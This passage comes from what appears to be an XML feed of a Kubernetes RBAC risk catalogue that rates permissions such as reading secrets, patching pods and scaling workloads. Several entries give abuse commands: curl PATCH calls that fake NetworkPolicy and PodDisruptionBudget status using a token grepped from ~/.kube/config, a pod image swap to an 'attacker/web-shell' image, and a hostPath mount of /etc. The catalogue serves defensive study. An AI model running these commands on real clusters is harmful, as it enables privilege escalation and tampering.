 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1010&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read secrets cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>secrets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusterwidesecretaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusterwidesecretaccess/">ClusterWideSecretAccess&lt;/a>&lt;/span>
 &lt;span class="tag-credentialaccess">&lt;a href="https://rbac-atlas.github.io/tags/credentialaccess/">CredentialAccess&lt;/a>&lt;/span>
 &lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants access to read all secrets across all namespaces in the cluster. This is extremely critical as secrets often contain sensitive credentials, API keys, tokens, and other confidential data, leading to widespread data exposure and potential full cluster compromise.&lt;/p></description></item><item><title>Read secrets in a namespace</title><link>https://rbac-atlas.github.io/rules/1011/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1011/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1011&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Read secrets in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>secrets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-credentialaccess">&lt;a href="https://rbac-atlas.github.io/tags/credentialaccess/">CredentialAccess&lt;/a>&lt;/span>
 &lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-secretaccess">&lt;a href="https://rbac-atlas.github.io/tags/secretaccess/">SecretAccess&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits reading all secrets within a specific namespace. Even though namespaced, this is critical as secrets store sensitive information like database credentials, API keys, and service account tokens, which can lead to data exposure and privilege escalation within or beyond the namespace.&lt;/p></description></item><item><title>Update CertificateSigningRequest Status (Tampering/DoS)</title><link>https://rbac-atlas.github.io/rules/1090/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1090/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1090&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Update CertificateSigningRequest Status (Tampering/DoS)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>certificates.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>certificatesigningrequests/status&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-certificatemanagement">&lt;a href="https://rbac-atlas.github.io/tags/certificatemanagement/">CertificateManagement&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows updating the status of CertificateSigningRequests (CSRs). This could be abused to prematurely mark CSRs as &amp;lsquo;Approved&amp;rsquo; or &amp;lsquo;Denied&amp;rsquo;, potentially bypassing approval workflows (if the approver is weak or misconfigured), blocking legitimate certificate issuance, or causing general confusion. Does not grant approval itself if an approver is required.&lt;/p></description></item><item><title>Update Deployment Scale (Resource Abuse/DoS)</title><link>https://rbac-atlas.github.io/rules/1096/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1096/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1096&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Update Deployment Scale (Resource Abuse/DoS)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>deployments/scale&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-resourcemodification">&lt;a href="https://rbac-atlas.github.io/tags/resourcemodification/">ResourceModification&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows updating the &amp;lsquo;scale&amp;rsquo; subresource of Deployments within a namespace. This can be abused to significantly increase or decrease the number of replicas for a deployment, potentially leading to resource exhaustion, denial of service, or unexpected operational costs.&lt;/p></description></item><item><title>Update NetworkPolicy Status (Cluster-wide Tampering)</title><link>https://rbac-atlas.github.io/rules/1093/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1093/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1093&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Update NetworkPolicy Status (Cluster-wide Tampering)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>networking.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>networkpolicies/status&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-networkpolicymanagement">&lt;a href="https://rbac-atlas.github.io/tags/networkpolicymanagement/">NetworkPolicyManagement&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows updating the status of NetworkPolicy objects across all namespaces. This could be abused to misrepresent the enforcement status of network policies, potentially hiding policy violations or misleading administrators about network segmentation.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Patch a NetworkPolicy&amp;rsquo;s status to falsely indicate it&amp;rsquo;s not ready or failed.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;kubernetes-api-server&amp;gt; with your API server address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;token&amp;gt; with your authentication token&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -k -H &lt;span class="s2">&amp;#34;Authorization: Bearer &amp;lt;token&amp;gt;&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> -X PATCH &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --data &lt;span class="s1">&amp;#39;{&amp;#34;status&amp;#34;:{&amp;#34;conditions&amp;#34;:[{&amp;#34;type&amp;#34;:&amp;#34;Ready&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;False&amp;#34;,&amp;#34;reason&amp;#34;:&amp;#34;PolicyError&amp;#34;,&amp;#34;message&amp;#34;:&amp;#34;Policy failed to apply due to internal error.&amp;#34;}]}}&amp;#39;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> https://&amp;lt;kubernetes-api-server&amp;gt;/apis/networking.k8s.io/v1/namespaces/&amp;lt;namespace&amp;gt;/networkpolicies/&amp;lt;policy-name&amp;gt;/status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: curl -k -H &amp;#34;Authorization: Bearer $(cat ~/.kube/config | grep token: | awk &amp;#39;{print $2}&amp;#39;)&amp;#34; -H &amp;#34;Content-Type: application/json&amp;#34; -X PATCH --data &amp;#39;{&amp;#34;status&amp;#34;:{&amp;#34;conditions&amp;#34;:[{&amp;#34;type&amp;#34;:&amp;#34;Ready&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;False&amp;#34;,&amp;#34;reason&amp;#34;:&amp;#34;PolicyError&amp;#34;,&amp;#34;message&amp;#34;:&amp;#34;Policy failed to apply due to internal error.&amp;#34;}]}}&amp;#39; https://127.0.0.1:6443/apis/networking.k8s.io/v1/namespaces/default/networkpolicies/my-policy/status&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Update PodDisruptionBudget Status (Namespace Tampering/DoS)</title><link>https://rbac-atlas.github.io/rules/1094/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1094/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1094&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Update PodDisruptionBudget Status (Namespace Tampering/DoS)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>policy&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>poddisruptionbudgets/status&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-availabilityimpact">&lt;a href="https://rbac-atlas.github.io/tags/availabilityimpact/">AvailabilityImpact&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating or updating the status of PodDisruptionBudget (PDB) objects within a namespace. This could be used to misrepresent the health or disruption allowance of workloads, potentially leading to unintended disruptions or bypassing availability safeguards.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Patch a PodDisruptionBudget&amp;rsquo;s status to misrepresent its health or allowed disruptions.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;kubernetes-api-server&amp;gt; with your API server address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;token&amp;gt; with your authentication token&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -k -H &lt;span class="s2">&amp;#34;Authorization: Bearer &amp;lt;token&amp;gt;&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> -X PATCH &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --data &lt;span class="s1">&amp;#39;{&amp;#34;status&amp;#34;:{&amp;#34;currentHealthy&amp;#34;:0,&amp;#34;desiredHealthy&amp;#34;:1,&amp;#34;disruptionsAllowed&amp;#34;:0,&amp;#34;expectedPods&amp;#34;:1}}&amp;#39;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> https://&amp;lt;kubernetes-api-server&amp;gt;/apis/policy/v1/namespaces/&amp;lt;namespace&amp;gt;/poddisruptionbudgets/&amp;lt;pdb-name&amp;gt;/status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: curl -k -H &amp;#34;Authorization: Bearer $(cat ~/.kube/config | grep token: | awk &amp;#39;{print $2}&amp;#39;)&amp;#34; -H &amp;#34;Content-Type: application/json&amp;#34; -X PATCH --data &amp;#39;{&amp;#34;status&amp;#34;:{&amp;#34;currentHealthy&amp;#34;:0,&amp;#34;desiredHealthy&amp;#34;:1,&amp;#34;disruptionsAllowed&amp;#34;:0,&amp;#34;expectedPods&amp;#34;:1}}&amp;#39; https://127.0.0.1:6443/apis/policy/v1/namespaces/default/poddisruptionbudgets/my-pdb/status&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Update StatefulSet Scale (Resource Abuse/DoS)</title><link>https://rbac-atlas.github.io/rules/1097/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1097/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1097&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Update StatefulSet Scale (Resource Abuse/DoS)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>statefulsets/scale&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-dataloss">&lt;a href="https://rbac-atlas.github.io/tags/dataloss/">DataLoss&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-resourcemodification">&lt;a href="https://rbac-atlas.github.io/tags/resourcemodification/">ResourceModification&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows updating the &amp;lsquo;scale&amp;rsquo; subresource of StatefulSets within a namespace. This can be abused to significantly increase or decrease the number of replicas for a stateful application, potentially leading to resource exhaustion, denial of service, data inconsistencies, or unexpected operational costs.&lt;/p></description></item><item><title>Update/Patch pods cluster-wide</title><link>https://rbac-atlas.github.io/rules/1008/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1008/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1008&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Update/Patch pods cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadexecution">&lt;a href="https://rbac-atlas.github.io/tags/workloadexecution/">WorkloadExecution&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits modifying existing pods in any namespace across the cluster. This is critical as an attacker can alter a pod&amp;rsquo;s specification to grant it elevated privileges (e.g., change image, add privileged security context, mount sensitive host paths), leading to code execution, privilege escalation, and tampering with running workloads.&lt;/p></description></item><item><title>Update/Patch pods in a namespace</title><link>https://rbac-atlas.github.io/rules/1009/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1009/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1009&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Update/Patch pods in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadexecution">&lt;a href="https://rbac-atlas.github.io/tags/workloadexecution/">WorkloadExecution&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows modifying existing pods within a specific namespace. This can be used to escalate privileges by changing a pod&amp;rsquo;s configuration to run with higher permissions, execute arbitrary code, or tamper with application behavior within that namespace.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Patch a running pod in the namespace to change its container image.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">set&lt;/span> image pod/&amp;lt;pod-name&amp;gt; &amp;lt;container-name&amp;gt;&lt;span class="o">=&lt;/span>&amp;lt;malicious-image&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl set image pod/my-web-app web=attacker/web-shell -n dev&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Patch a running pod to add a hostPath volume mount (if not blocked by PSP/PSA).&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl patch pod &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/volumes/-&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;host-path-vol&amp;#34;, &amp;#34;hostPath&amp;#34;: {&amp;#34;path&amp;#34;: &amp;#34;/etc&amp;#34;}}}, {&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/containers/0/volumeMounts/-&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;host-path-vol&amp;#34;, &amp;#34;mountPath&amp;#34;: &amp;#34;/mnt/host-etc&amp;#34;}}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch pod my-app -n default --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/volumes/-&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;host-path-vol&amp;#34;, &amp;#34;hostPath&amp;#34;: {&amp;#34;path&amp;#34;: &amp;#34;/etc&amp;#34;}}}, {&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/containers/0/volumeMounts/-&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;host-path-vol&amp;#34;, &amp;#34;mountPath&amp;#34;: &amp;#34;/mnt/host-etc&amp;#34;}}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Use privileged PodSecurityPolicy (deprecated)</title><link>https://rbac-atlas.github.io/rules/1078/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1078/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1078&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Use privileged PodSecurityPolicy (deprecated)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
